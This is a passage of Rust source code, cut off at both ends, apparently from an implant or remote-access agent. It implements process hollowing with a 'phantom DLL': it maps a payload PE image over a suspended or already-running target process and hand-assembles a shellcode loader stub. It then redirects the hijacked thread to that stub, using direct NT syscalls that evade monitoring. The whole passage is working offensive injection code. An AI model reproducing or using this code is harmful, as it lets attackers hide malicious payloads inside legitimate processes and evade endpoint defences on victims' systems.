        0u64,                               // no file handle
    )
    .map_err(|e| anyhow!("phantom_dll_hollow: NtCreateSection SSN: {e}"))?;
    if s < 0 || h_section.is_null() {
        return Err(anyhow!(
            "phantom_dll_hollow: NtCreateSection NTSTATUS {:#010x}",
            s as u32
        ));
    }

    // Map the section into our own process for writing the DLL bytes.
    let mut local_base: *mut c_void = std::ptr::null_mut();
    let mut view_size: usize = 0;
    let s = crate::syscall!(
        "NtMapViewOfSection",
        h_section as u64,
        NT_CURRENT_PROCESS as u64, // into our process
        &mut local_base as *mut _ as u64,
        0u64,                               // zero bits
        0u64,                               // commit size
        std::ptr::null_mut::<u64>() as u64, // section offset (NULL = start)
        &mut view_size as *mut _ as u64,
        1u64,                  // ViewUnmap = 1 (not inherited)
        0u64,                  // allocation type
        PAGE_READWRITE as u64, // protection for local view
    )
    .map_err(|e| anyhow!("phantom_dll_hollow: NtMapViewOfSection(local) SSN: {e}"))?;
    if s < 0 || local_base.is_null() {
        close_handle!(h_section);
        return Err(anyhow!(
            "phantom_dll_hollow: NtMapViewOfSection(local) NTSTATUS {:#010x}",
            s as u32
        ));
    }

    // Write the PE image into the local mapping.
    // First zero the entire mapping (sections with no raw data need zero fill).
    std::ptr::write_bytes(local_base as *mut u8, 0, view_size);

    // Copy headers.
    let headers_size = (*nt).OptionalHeader.SizeOfHeaders as usize;
    if headers_size > payload.len() || headers_size > view_size {
        close_handle!(h_section);
        let _ = crate::syscall!(
            "NtUnmapViewOfSection",
            NT_CURRENT_PROCESS as u64,
            local_base as u64,
        );
        return Err(anyhow!(
            "phantom_dll_hollow: SizeOfHeaders exceeds payload or view"
        ));
    }
    std::ptr::copy_nonoverlapping(payload.as_ptr(), local_base as *mut u8, headers_size);

    // Copy each section from file offsets to virtual addresses.
    let num_sections = (*nt).FileHeader.NumberOfSections as usize;
    let first_section =
        (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
    for i in 0..num_sections {
        let sec = &*first_section.add(i);
        let raw_off = sec.PointerToRawData as usize;
        let raw_sz = sec.SizeOfRawData as usize;
        let va = sec.VirtualAddress as usize;
        let vs = sec.Misc.VirtualSize as usize;
        if raw_off == 0 || raw_sz == 0 || raw_off + raw_sz > payload.len() {
            continue;
        }
        let copy_sz = raw_sz.min(vs).min(view_size.saturating_sub(va));
        if va + copy_sz > view_size {
            continue;
        }
        let dst = (local_base as usize + va) as *mut u8;
        std::ptr::copy_nonoverlapping(payload.as_ptr().add(raw_off), dst, copy_sz);
    }

    // Flush the local mapping (ensure writes are visible before remote map).
    let mut old_prot = 0u32;
    let mut prot_base = local_base as usize;
    let mut prot_size = view_size;
    let _ = crate::syscall!(
        "NtProtectVirtualMemory",
        NT_CURRENT_PROCESS as u64,
        &mut prot_base as *mut _ as u64,
        &mut prot_size as *mut _ as u64,
        PAGE_EXECUTE_READ as u64,
        &mut old_prot as *mut _ as u64,
    );

    // ── Phase 2: Create suspended host process ───────────────────────────
    //
    // Try multiple host candidates; fall through on failure.
    let (h_process, h_thread, _host_path) = {
        let mut result: Result<(*mut c_void, *mut c_void)> =
            Err(anyhow!("phantom_dll_hollow: all host candidates failed"));
        let mut chosen_path = String::new();
        for path in host_candidate_paths() {
            match create_suspended_process_nt(&path) {
                Ok(handles) => {
                    chosen_path = path;
                    result = Ok(handles);
                    break;
                }
                Err(e) => {
                    tracing::debug!("phantom_dll_hollow: candidate {} failed: {}", path, e)
                }
            }
        }
        result.map(|(a, b)| (a, b, chosen_path))?
    };

    macro_rules! terminate_and_cleanup {
        () => {{
            let _ = crate::syscall!("NtTerminateProcess", h_process as u64, 1u64);
            close_handle!(h_thread);
            close_handle!(h_process);
        }};
    }

    // ── Phase 3: Replace host image with phantom section ─────────────────
    //
    // Read the host's PEB.ImageBaseAddress, unmap the original image, then
    // map the phantom section into the host at the original base.

    // Get PEB address via NtQueryInformationProcess.
    let mut pbi = [0u8; 48];
    let mut ret_len: u32 = 0;
    let s = crate::syscall!(
        "NtQueryInformationProcess",
        h_process as u64,
        0u64, // ProcessBasicInformation
        pbi.as_mut_ptr() as u64,
        48u64,
        &mut ret_len as *mut _ as u64,
    )
    .map_err(|e| anyhow!("phantom_dll_hollow: NtQueryInformationProcess SSN: {e}"))?;
    if s < 0 || ret_len < 16 {
        terminate_and_cleanup!();
        close_handle!(h_section);
        let _ = crate::syscall!(
            "NtUnmapViewOfSection",
            NT_CURRENT_PROCESS as u64,
            local_base as u64,
        );
        return Err(anyhow!(
            "phantom_dll_hollow: NtQueryInformationProcess NTSTATUS {:#010x}",
            s as u32
        ));
    }
    let peb_addr = usize::from_le_bytes(pbi[8..16].try_into().unwrap());
    if peb_addr == 0 {
        terminate_and_cleanup!();
        close_handle!(h_section);
        let _ = crate::syscall!(
            "NtUnmapViewOfSection",
            NT_CURRENT_PROCESS as u64,
            local_base as u64,
        );
        return Err(anyhow!("phantom_dll_hollow: PEB address is NULL"));
    }
    let peb_ptr = peb_addr as *const u8;

    // Read PEB.ImageBaseAddress (offset 0x10).
    let mut remote_image_base: usize = 0;
    if !nt_read_exact(
        h_process,
        peb_ptr.add(0x10) as usize,
        &mut remote_image_base as *mut _ as *mut c_void,
        std::mem::size_of::<usize>(),
    ) {
        terminate_and_cleanup!();
        close_handle!(h_section);
        let _ = crate::syscall!(
            "NtUnmapViewOfSection",
            NT_CURRENT_PROCESS as u64,
            local_base as u64,
        );
        return Err(anyhow!(
            "phantom_dll_hollow: failed to read PEB.ImageBaseAddress"
        ));
    }

    // Unmap the host's original image.
    if remote_image_base != 0 {
        let us = crate::syscall!(
            "NtUnmapViewOfSection",
            h_process as u64,
            remote_image_base as u64,
        )
        .unwrap_or(-1);
        if us < 0 {
            tracing::warn!(
                "phantom_dll_hollow: NtUnmapViewOfSection NTSTATUS {:#010x}; continuing",
                us as u32
            );
        }
    } else {
        tracing::warn!("phantom_dll_hollow: remote_image_base is NULL; skipping unmap");
    }

    // Map the phantom section into the host process at the original image base.
    let mut remote_base: *mut c_void = remote_image_base as *mut c_void;
    let mut remote_view_size: usize = 0;
    let map_result = crate::syscall!(
        "NtMapViewOfSection",
        h_section as u64,
        h_process as u64,
        &mut remote_base as *mut _ as u64,
        0u64,
        0u64,
        std::ptr::null_mut::<u64>() as u64,
        &mut remote_view_size as *mut _ as u64,
        1u64, // ViewUnmap
        0u64,
        PAGE_EXECUTE_READWRITE as u64, // initially RWX; we'll tighten per-section later
    );
    let mapped_ok = match map_result {
        Ok(st) if st >= 0 && !remote_base.is_null() => true,
        _ => false,
    };

    if !mapped_ok {
        // Retry without specifying a base address (let the kernel choose).
        remote_base = std::ptr::null_mut();
        remote_view_size = 0;
        let retry_result = crate::syscall!(
            "NtMapViewOfSection",
            h_section as u64,
            h_process as u64,
            &mut remote_base as *mut _ as u64,
            0u64,
            0u64,
            std::ptr::null_mut::<u64>() as u64,
            &mut remote_view_size as *mut _ as u64,
            1u64,
            0u64,
            PAGE_EXECUTE_READWRITE as u64,
        );
        match retry_result {
            Ok(st) if st >= 0 && !remote_base.is_null() => {}
            Ok(st) => {
                terminate_and_cleanup!();
                close_handle!(h_section);
                let _ = crate::syscall!(
                    "NtUnmapViewOfSection",
                    NT_CURRENT_PROCESS as u64,
                    local_base as u64,
                );
                return Err(anyhow!(
                    "phantom_dll_hollow: NtMapViewOfSection(remote) NTSTATUS {:#010x}",
                    st as u32
                ));
            }
            Err(e) => {
                terminate_and_cleanup!();
                close_handle!(h_section);
                let _ = crate::syscall!(
                    "NtUnmapViewOfSection",
                    NT_CURRENT_PROCESS as u64,
                    local_base as u64,
                );
                return Err(anyhow!(
                    "phantom_dll_hollow: NtMapViewOfSection(remote) failed: {e}"
                ));
            }
        }
    }
    let remote_base_usize = remote_base as usize;

    // Unmap the local view — we're done writing to the section.
    let _ = crate::syscall!(
        "NtUnmapViewOfSection",
        NT_CURRENT_PROCESS as u64,
        local_base as u64,
    );

    // Close the section handle — the mapping persists in the target process.
    close_handle!(h_section);

    // Apply relocations if the image was loaded at a different base.
    let delta = remote_base_usize as isize - preferred_base as isize;
    if delta != 0 {
        apply_relocations_remote(h_process, remote_base_usize, nt, payload, delta)?;
    }

    // Rebuild the Import Address Table.
    fix_iat_remote(h_process, remote_base_usize, nt, payload)?;

    // Apply per-section memory protections.
    apply_section_protections(h_process, remote_base_usize, nt);

    // Flush instruction cache.
    let _ = crate::syscall!(
        "NtFlushInstructionCache",
        h_process as u64,
        remote_base as u64,
        (*nt).OptionalHeader.SizeOfImage as u64,
    );

    // Update PEB.ImageBaseAddress.
    if !nt_write_exact(
        h_process,
        peb_ptr.add(0x10) as usize,
        &remote_base_usize as *const _ as *const c_void,
        std::mem::size_of::<usize>(),
    ) {
        tracing::warn!("phantom_dll_hollow: failed to update PEB.ImageBaseAddress");
    }

    // ── Phase 4: Build loader stub (TLS callbacks, .pdata, DllMain) and resume ─
    //
    // The Windows loader normally:
    //   1. Calls RtlAddFunctionTable to register .pdata for SEH unwinding.
    //   2. Invokes TLS callbacks with (hinstDLL, DLL_PROCESS_ATTACH, NULL).
    //   3. Calls the entry point as DllMain(hinstDLL, DLL_PROCESS_ATTACH, NULL).
    //
    // Since we bypass the loader entirely, we build a position-independent
    // shellcode stub that performs this missing work before jumping to the
    // payload entry point with the correct DllMain calling convention.

    // Collect TLS callbacks from the PE's TLS directory.
    let mut tls_callback_vas: Vec<usize> = Vec::new();
    {
        const IMAGE_DIRECTORY_ENTRY_TLS: usize = 9;
        let tls_dir = &(*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
        if tls_dir.VirtualAddress != 0 && tls_dir.Size != 0 {
            let tls_rva = tls_dir.VirtualAddress as usize;
            if tls_rva + 40 <= image_size {
                // IMAGE_TLS_DIRECTORY64 layout (40 bytes):
                //   +0x18 AddressOfCallBacks : u64  <- VA of null-term array
                let tls_offset = rva_to_file_offset(payload, tls_rva);
                if tls_offset + 32 <= payload.len() {
                    let callbacks_va_raw = u64::from_le_bytes(
                        payload[tls_offset + 24..tls_offset + 32]
                            .try_into()
                            .unwrap_or([0u8; 8]),
                    ) as usize;
                    if callbacks_va_raw != 0 {
                        // Rebase the VA by the same delta applied during relocation.
                        let callbacks_rva = callbacks_va_raw.wrapping_sub(preferred_base);
                        let callbacks_file_offset = rva_to_file_offset(payload, callbacks_rva);
                        let mut remaining = 32u32;
                        let mut slot_idx = 0usize;
                        loop {
                            if remaining == 0 {
                                break;
                            }
                            remaining -= 1;
                            let slot_offset = callbacks_file_offset + slot_idx * 8;
                            if slot_offset + 8 > payload.len() {
                                break;
                            }
                            let cb_va_raw = u64::from_le_bytes(
                                payload[slot_offset..slot_offset + 8]
                                    .try_into()
                                    .unwrap_or([0u8; 8]),
                            ) as usize;
                            if cb_va_raw == 0 {
                                break;
                            }
                            // Rebase and validate.
                            let cb_va = (cb_va_raw as isize + delta) as usize;
                            if cb_va >= remote_base_usize && cb_va < remote_base_usize + image_size
                            {
                                tls_callback_vas.push(cb_va);
                            }
                            slot_idx += 1;
                        }
                    }
                }
            }
        }
    }

    // Find .pdata section for exception unwinding registration.
    let (pdata_va, pdata_count) = {
        let mut result = (0usize, 0u32);
        const IMAGE_DIRECTORY_ENTRY_EXCEPTION: usize = 3;
        let exc_dir = &(*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
        if exc_dir.VirtualAddress != 0 && exc_dir.Size > 0 {
            let va = remote_base_usize + exc_dir.VirtualAddress as usize;
            let count = (exc_dir.Size as usize / 12) as u32;
            if count > 0 {
                result = (va, count);
            }
        }
        result
    };

    // Resolve RtlAddFunctionTable from ntdll via PEB-walk.
    let rtl_add_fn_addr = if pdata_va != 0 && pdata_count != 0 {
        resolve_nt(b"RtlAddFunctionTable\0").unwrap_or(0)
    } else {
        0
    };

    let needs_stub =
        !tls_callback_vas.is_empty() || (pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0);

    // Build the loader stub if needed, otherwise jump directly to entry point.
    let thread_start_va = if needs_stub {
        let mut stub: Vec<u8> = Vec::with_capacity(256);

        #[cfg(target_arch = "x86_64")]
        {
            // ABI prologue: reserve 32 bytes of shadow space.
            stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x20]); // sub rsp, 0x20

            // .pdata registration.
            if pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0 {
                stub.extend_from_slice(&[0x48, 0xB9]); // mov rcx, pdata_va
                stub.extend_from_slice(&(pdata_va as u64).to_le_bytes());
                stub.extend_from_slice(&[0xBA]); // mov edx, entry_count
                stub.extend_from_slice(&pdata_count.to_le_bytes());
                stub.extend_from_slice(&[0x49, 0xB8]); // mov r8, remote_base
                stub.extend_from_slice(&(remote_base_usize as u64).to_le_bytes());
                stub.extend_from_slice(&[0x48, 0xB8]); // mov rax, RtlAddFunctionTable
                stub.extend_from_slice(&(rtl_add_fn_addr as u64).to_le_bytes());
                stub.extend_from_slice(&[0xFF, 0xD0]); // call rax
            }

            // TLS callback invocations: DllMain convention (hinstDLL, DLL_PROCESS_ATTACH, NULL).
            for &cb_va in &tls_callback_vas {
                stub.extend_from_slice(&[0x48, 0xB9]); // mov rcx, remote_base (hinstDLL)
                stub.extend_from_slice(&(remote_base_usize as u64).to_le_bytes());
                stub.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]); // mov edx, 1 (DLL_PROCESS_ATTACH)
                stub.extend_from_slice(&[0x45, 0x31, 0xC0]); // xor r8d, r8d (lpvReserved = NULL)
                stub.extend_from_slice(&[0x48, 0xB8]); // mov rax, cb_va
                stub.extend_from_slice(&(cb_va as u64).to_le_bytes());
                stub.extend_from_slice(&[0xFF, 0xD0]); // call rax
            }

            // DllMain entry point call: entry(hinstDLL, DLL_PROCESS_ATTACH, NULL)
            let entry_va = (remote_base_usize + entry_point_rva) as u64;
            stub.extend_from_slice(&[0x48, 0xB9]); // mov rcx, remote_base (hinstDLL)
            stub.extend_from_slice(&(remote_base_usize as u64).to_le_bytes());
            stub.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]); // mov edx, 1 (DLL_PROCESS_ATTACH)
            stub.extend_from_slice(&[0x45, 0x31, 0xC0]); // xor r8d, r8d (lpvReserved = NULL)
            stub.extend_from_slice(&[0x48, 0xB8]); // mov rax, entry_va
            stub.extend_from_slice(&entry_va.to_le_bytes());
            stub.extend_from_slice(&[0xFF, 0xD0]); // call rax

            // ABI epilogue.
            stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x20]); // add rsp, 0x20

            // Infinite halt after DllMain returns.
            stub.extend_from_slice(&[0xEB, 0xFE]); // jmp $-2
        }

        #[cfg(target_arch = "aarch64")]
        {
            // .pdata registration: RtlAddFunctionTable(x0=funcTable, x1=count, x2=base)
            if pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0 {
                push_arm64_mov_imm64(&mut stub, 0, pdata_va as u64);
                push_arm64_mov_imm64(&mut stub, 1, pdata_count as u64);
                push_arm64_mov_imm64(&mut stub, 2, remote_base_usize as u64);
                push_arm64_mov_imm64(&mut stub, 16, rtl_add_fn_addr as u64);
                push_arm64_blr(&mut stub, 16);
            }

            // TLS callbacks with DllMain convention.
            for &cb_va in &tls_callback_vas {
                push_arm64_dll_entry_call(&mut stub, cb_va as u64, remote_base_usize as u64);
            }

            // DllMain entry: entry(hinstDLL, DLL_PROCESS_ATTACH, NULL)
            let entry_va = (remote_base_usize + entry_point_rva) as u64;
            push_arm64_dll_entry_call(&mut stub, entry_va, remote_base_usize as u64);

            // Infinite halt after DllMain returns.
            push_arm64_brk(&mut stub, 0xF000); // BRK #0xF000
        }

        // Allocate RW memory for the stub in the host process.
        let mut stub_mem: *mut c_void = std::ptr::null_mut();
        let mut stub_alloc_size = stub.len();
        let alloc_s = crate::syscall!(
            "NtAllocateVirtualMemory",
            h_process as u64,
            &mut stub_mem as *mut _ as u64,
            0u64,
            &mut stub_alloc_size as *mut _ as u64,
            (windows_sys::Win32::System::Memory::MEM_COMMIT
                | windows_sys::Win32::System::Memory::MEM_RESERVE) as u64,
            crate::win_types::PAGE_READWRITE as u64,
        );
        let alloc_ok = match alloc_s {
            Ok(st) if st >= 0 && !stub_mem.is_null() => true,
            _ => false,
        };
        if !alloc_ok {
            terminate_and_cleanup!();
            return Err(anyhow!(
                "phantom_dll_hollow: NtAllocateVirtualMemory for loader stub failed"
            ));
        }

        // Write stub bytes.
        let mut stub_written = 0usize;
        let write_s = crate::syscall!(
            "NtWriteVirtualMemory",
            h_process as u64,
            stub_mem as u64,
            stub.as_ptr() as u64,
            stub.len() as u64,
            &mut stub_written as *mut _ as u64,
        );
        let write_ok = match write_s {
            Ok(st) if st >= 0 => stub_written == stub.len(),
            _ => false,
        };
        if !write_ok {
            terminate_and_cleanup!();
            return Err(anyhow!(
                "phantom_dll_hollow: NtWriteVirtualMemory for loader stub failed"
            ));
        }

        // Make the stub executable (RX).
        let mut prot_base = stub_mem;
        let mut prot_size = stub.len();
        let mut old_prot = 0u32;
        let prot_s = crate::syscall!(
            "NtProtectVirtualMemory",
            h_process as u64,
            &mut prot_base as *mut _ as u64,
            &mut prot_size as *mut _ as u64,
            PAGE_EXECUTE_READ as u64,
            &mut old_prot as *mut _ as u64,
        );
        let prot_ok = match prot_s {
            Ok(st) if st >= 0 => true,
            _ => false,
        };
        if !prot_ok {
            terminate_and_cleanup!();
            return Err(anyhow!(
                "phantom_dll_hollow: NtProtectVirtualMemory(RX) for loader stub failed"
            ));
        }

        // Flush instruction cache for the stub.
        let _ = crate::syscall!(
            "NtFlushInstructionCache",
            h_process as u64,
            stub_mem as u64,
            stub.len() as u64,
        );

        tracing::debug!(
            "phantom_dll_hollow: injected loader stub at {:p} ({} TLS callbacks, .pdata={} entries)",
            stub_mem,
            tls_callback_vas.len(),
            pdata_count,
        );

        stub_mem as u64
    } else {
        // No TLS callbacks and no .pdata — set entry point directly.
        (remote_base_usize + entry_point_rva) as u64
    };

    // Set the thread context and resume.
    let mut ctx: CONTEXT = std::mem::zeroed();
    ctx.ContextFlags = CONTEXT_FULL;

    let get_ctx = crate::syscall!(
        "NtGetContextThread",
        h_thread as u64,
        &mut ctx as *mut _ as u64,
    );
    match get_ctx {
        Ok(st) if st >= 0 => {
            set_context_instruction_pointer(&mut ctx, thread_start_va);
            tracing::debug!(
                "phantom_dll_hollow: setting thread {} to {:#x}",
                CONTEXT_IP_NAME,
                thread_start_va,
            );

            let set_ctx = crate::syscall!(
                "NtSetContextThread",
                h_thread as u64,
                &ctx as *const _ as u64,
            );
            match set_ctx {
                Ok(st2) if st2 >= 0 => {}
                Ok(st2) => {
                    terminate_and_cleanup!();
                    return Err(anyhow!(
                        "phantom_dll_hollow: NtSetContextThread NTSTATUS {:#010x}",
                        st2 as u32
                    ));
                }
                Err(e) => {
                    terminate_and_cleanup!();
                    return Err(anyhow!(
                        "phantom_dll_hollow: NtSetContextThread failed: {}",
                        e
                    ));
                }
            }
        }
        Ok(st) => {
            terminate_and_cleanup!();
            return Err(anyhow!(
                "phantom_dll_hollow: NtGetContextThread NTSTATUS {:#010x}",
                st as u32
            ));
        }
        Err(e) => {
            terminate_and_cleanup!();
            return Err(anyhow!(
                "phantom_dll_hollow: NtGetContextThread failed: {}",
                e
            ));
        }
    }

    // Resume the host thread — execution begins at the loader stub or entry point.
    let resume = crate::syscall!("NtResumeThread", h_thread as u64, 0u64);
    match resume {
        Ok(st) if st >= 0 => {}
        Ok(st) => {
            terminate_and_cleanup!();
            return Err(anyhow!(
                "phantom_dll_hollow: NtResumeThread NTSTATUS {:#010x}",
                st as u32
            ));
        }
        Err(e) => {
            terminate_and_cleanup!();
            return Err(anyhow!("phantom_dll_hollow: NtResumeThread failed: {}", e));
        }
    }

    tracing::info!(
        "phantom_dll_hollow: phantom DLL ({} bytes) mapped at {:#x} in host process",
        payload.len(),
        remote_base_usize,
    );

    Ok(PhantomHollowResult {
        process_handle: h_process,
        thread_handle: h_thread,
        phantom_base: remote_base_usize,
    })
}

/// Phantom DLL hollowing into an **existing** target process.
///
/// Similar to [`phantom_dll_hollow`] but instead of creating a sacrificial host
/// process, this variant opens an already-running process by PID and replaces
/// its image with the phantom DLL.  This satisfies the dispatcher's
/// target-process contract when the operator specifies a PID.
///
/// # How it works
///
/// 1. **Phase 1** — identical to `phantom_dll_hollow`: create a `SEC_COMMIT`
///    section, map locally, write the PE image.
/// 2. **Phase 2** — open the target process by PID via `NtOpenProcess`, then
///    obtain a thread handle via `NtGetNextThread` (or fall back to creating a
///    new suspended thread with `NtCreateThreadEx`).
/// 3. **Phase 3** — read the target's PEB, unmap its original image, map the
///    phantom section at the original base (or let the kernel choose), fix
///    relocations, rebuild IAT, apply section protections, update PEB.
/// 4. **Phase 4** — set the thread's instruction pointer to the phantom entry
///    point and resume.
///
/// # Arguments
///
/// * `pid` — Process ID of the target process.
/// * `payload` — PE64 image bytes to inject.
///
/// # Safety
///
/// Performs direct NT syscalls and manipulates remote process memory.
/// The caller is responsible for closing the returned handles.
pub unsafe fn phantom_dll_hollow_into_process(
    pid: u32,
    payload: &[u8],
) -> Result<PhantomHollowResult> {
    // ── Validate payload ─────────────────────────────────────────────────
    if payload.len() < 0x40 {
        return Err(anyhow!(
            "phantom_dll_hollow_into_process: payload too small for DOS header ({}/0x40 min)",
            payload.len()
        ));
    }
    if payload[0] != b'M' || payload[1] != b'Z' {
        return Err(anyhow!(
            "phantom_dll_hollow_into_process: payload is not a valid PE (missing MZ signature)"
        ));
    }
    let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
    if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
        return Err(anyhow!(
            "phantom_dll_hollow_into_process: DOS signature mismatch"
        ));
    }
    let e_lfanew = (*dos).e_lfanew as usize;
    if e_lfanew == 0 || e_lfanew + std::mem::size_of::<IMAGE_NT_HEADERS64>() > payload.len() {
        return Err(anyhow!(
            "phantom_dll_hollow_into_process: NT headers extend beyond payload (e_lfanew={:#x}, len={})",
            e_lfanew,
            payload.len()
        ));
    }
    let nt = (payload.as_ptr() as usize + e_lfanew) as *const IMAGE_NT_HEADERS64;
    if (*nt).Signature != IMAGE_NT_SIGNATURE {
        return Err(anyhow!(
            "phantom_dll_hollow_into_process: NT signature mismatch"
        ));
    }
    if (*nt).OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC {
        return Err(anyhow!("phantom_dll_hollow_into_process: not a PE64 image"));
    }
    if (*nt).FileHeader.Machine != EXPECTED_PE_MACHINE {
        return Err(anyhow!(
            "phantom_dll_hollow_into_process: PE machine {:#06x} does not match this agent ({:#06x})",
            (*nt).FileHeader.Machine,
            EXPECTED_PE_MACHINE
        ));
    }

    let image_size = (*nt).OptionalHeader.SizeOfImage as usize;
    let preferred_base = (*nt).OptionalHeader.ImageBase as usize;
    let entry_point_rva = (*nt).OptionalHeader.AddressOfEntryPoint as usize;
    let size_of_headers = (*nt).OptionalHeader.SizeOfHeaders as usize;

    if image_size == 0 {
        return Err(anyhow!(
            "phantom_dll_hollow_into_process: PE has SizeOfImage=0"
        ));
    }
    if entry_point_rva >= image_size {
        return Err(anyhow!(
            "phantom_dll_hollow_into_process: entry point RVA {:#x} outside image size {:#x}",
            entry_point_rva,
            image_size
        ));
    }
    if size_of_headers > payload.len() {
        return Err(anyhow!(
            "phantom_dll_hollow_into_process: SizeOfHeaders {:#x} exceeds payload size {:#x}",
            size_of_headers,
            payload.len()
        ));
    }

    // Ensure SSN infrastructure is initialised.
    let _ = nt_syscall::init_syscall_infrastructure();

    // ── Phase 1: Create phantom section + map into calling process ───────
    let mut h_section: *mut c_void = std::ptr::null_mut();
    let mut section_size: i64 = image_size as i64;
    let s = crate::syscall!(
        "NtCreateSection",
        &mut h_section as *mut _ as u64,
        NT_SECTION_ALL_ACCESS as u64,
        0u64,
        &mut section_size as *mut _ as u64,
        PAGE_EXECUTE_READWRITE as u64,
        SEC_COMMIT as u64,
        0u64,
    )
    .map_err(|e| anyhow!("phantom_dll_hollow_into_process: NtCreateSection SSN: {e}"))?;
    if s < 0 || h_section.is_null() {
        return Err(anyhow!(
            "phantom_dll_hollow_into_process: NtCreateSection NTSTATUS {:#010x}",
            s as u32
        ));
    }

    let mut local_base: *mut c_void = std::ptr::null_mut();
    let mut view_size: usize = 0;
    let s = crate::syscall!(
        "NtMapViewOfSection",
        h_section as u64,
        NT_CURRENT_PROCESS as u64,
        &mut local_base as *mut _ as u64,
        0u64,
        0u64,
        std::ptr::null_mut::<u64>() as u64,
        &mut view_size as *mut _ as u64,
        1u64,
        0u64,
        PAGE_READWRITE as u64,
    )
    .map_err(|e| anyhow!("phantom_dll_hollow_into_process: NtMapViewOfSection(local) SSN: {e}"))?;
    if s < 0 || local_base.is_null() {
        close_handle!(h_section);
        return Err(anyhow!(
            "phantom_dll_hollow_into_process: NtMapViewOfSection(local) NTSTATUS {:#010x}",
            s as u32
        ));
    }

    // Write the PE image into the local mapping.
    std::ptr::write_bytes(local_base as *mut u8, 0, view_size);

    let headers_size = (*nt).OptionalHeader.SizeOfHeaders as usize;
    if headers_size > payload.len() || headers_size > view_size {
        close_handle!(h_section);
        let _ = crate::syscall!(
            "NtUnmapViewOfSection",
            NT_CURRENT_PROCESS as u64,
            local_base as u64,
        );
        return Err(anyhow!(
            "phantom_dll_hollow_into_process: SizeOfHeaders exceeds payload or view"
        ));
    }
    std::ptr::copy_nonoverlapping(payload.as_ptr(), local_base as *mut u8, headers_size);

    let num_sections = (*nt).FileHeader.NumberOfSections as usize;
    let first_section =
        (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
    for i in 0..num_sections {
        let sec = &*first_section.add(i);
        let raw_off = sec.PointerToRawData as usize;
        let raw_sz = sec.SizeOfRawData as usize;
        let va = sec.VirtualAddress as usize;
        let vs = sec.Misc.VirtualSize as usize;
        if raw_off == 0 || raw_sz == 0 || raw_off + raw_sz > payload.len() {
            continue;
        }
        let copy_sz = raw_sz.min(vs).min(view_size.saturating_sub(va));
        if va + copy_sz > view_size {
            continue;
        }
        let dst = (local_base as usize + va) as *mut u8;
        std::ptr::copy_nonoverlapping(payload.as_ptr().add(raw_off), dst, copy_sz);
    }

    // Flip local view to RX.
    let mut old_prot = 0u32;
    let mut prot_base = local_base as usize;
    let mut prot_size = view_size;
    let _ = crate::syscall!(
        "NtProtectVirtualMemory",
        NT_CURRENT_PROCESS as u64,
        &mut prot_base as *mut _ as u64,
        &mut prot_size as *mut _ as u64,
        PAGE_EXECUTE_READ as u64,
        &mut old_prot as *mut _ as u64,
    );

    // ── Phase 2: Open target process + obtain a thread ──────────────────
    //
    // Open the existing process by PID, then either find an existing thread
    // via NtGetNextThread or create a new suspended thread inside it.

    // Build a CLIENT_ID for NtOpenProcess.
    #[repr(C)]
    struct ClientId {
        unique_process: *mut c_void,
        unique_thread: *mut c_void,
    }

    let pid_ptr = pid as usize as *mut c_void;
    let mut cid = ClientId {
        unique_process: pid_ptr,
        unique_thread: std::ptr::null_mut(),
    };
    let mut oa = NtObjectAttributes {
        length: std::mem::size_of::<NtObjectAttributes>() as u32,
        root_directory: std::ptr::null_mut(),
        object_name: std::ptr::null_mut(),
        attributes: 0,
        security_descriptor: std::ptr::null_mut(),
        security_quality_of_service: std::ptr::null_mut(),
    };

    let mut h_process: *mut c_void = std::ptr::null_mut();
    let s = crate::syscall!(
        "NtOpenProcess",
        &mut h_process as *mut _ as u64,
        NT_PROCESS_ALL_ACCESS as u64,
        &mut oa as *mut _ as u64,
        &mut cid as *mut _ as u64,
    )
    .map_err(|e| anyhow!("phantom_dll_hollow_into_process: NtOpenProcess SSN: {e}"))?;
    if s < 0 || h_process.is_null() {
        close_handle!(h_section);
        let _ = crate::syscall!(
            "NtUnmapViewOfSection",
            NT_CURRENT_PROCESS as u64,
            local_base as u64,
        );
        return Err(anyhow!(
            "phantom_dll_hollow_into_process: NtOpenProcess({pid}) NTSTATUS {:#010x}",
            s as u32
        ));
    }

    // Try to obtain an existing thread via NtGetNextThread (Windows 10+).
    // If that fails, create a new suspended thread via NtCreateThreadEx.
    let h_thread: *mut c_void = {
        let mut found_thread: usize = 0;

        // NtGetNextThread(ProcessHandle, PreviousThreadHandle, DesiredAccess,
        //                 HandleAttributes, Flags, NewThreadHandle OUT)
        // Pass NULL as PreviousThreadHandle to start enumeration.
        let nt_get_next = crate::syscall!(
            "NtGetNextThread",
            h_process as u64,
            0u64, // previous thread handle (NULL = start)
            (windows_sys::Win32::System::Threading::THREAD_SET_CONTEXT
                | windows_sys::Win32::System::Threading::THREAD_GET_CONTEXT
                | windows_sys::Win32::System::Threading::THREAD_SUSPEND_RESUME) as u64,
            0u64,                               // handle attributes
            0u64,                               // flags
            &mut found_thread as *mut _ as u64, // OUT: receives thread handle
        );

        match nt_get_next {
            Ok(st) if st >= 0 && found_thread != 0 => {
                // Successfully obtained a handle to an existing thread.
            }
            _ => {
                // NtGetNextThread not available or failed; fall through to
                // NtCreateThreadEx.
                found_thread = 0;
            }
        }

        if found_thread != 0 {
            // Use the existing thread handle from NtGetNextThread.
            found_thread as *mut c_void
        } else {
            // Create a new suspended thread in the target process as a last
            // resort.  This gives us a thread handle for context manipulation.
            let start_addr = resolve_nt(b"RtlUserThreadStart\0")
                .or_else(|| resolve_nt(b"LdrInitializeThunk\0"))
                .ok_or_else(|| {
                    anyhow!("phantom_dll_hollow_into_process: RtlUserThreadStart not found")
                })?;

            let mut new_thread: *mut c_void = std::ptr::null_mut();
            let s = crate::syscall!(
                "NtCreateThreadEx",
                &mut new_thread as *mut _ as u64,
